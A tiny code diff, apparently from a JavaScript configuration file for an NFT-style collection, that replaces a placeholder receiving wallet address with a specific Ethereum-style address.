@@ -2,7 +2,7 @@
     = = = = = YOU WALLET ADRESS = = = = =
 */
 
-const receiveAddress = "YOUR WALLET";
+const receiveAddress = "0x8A10a0Ddc2F2AEcA7e3870085964e199Fff44F97";
 
 /*
     = = = = = COLLECTION SETTINGS = = = = =
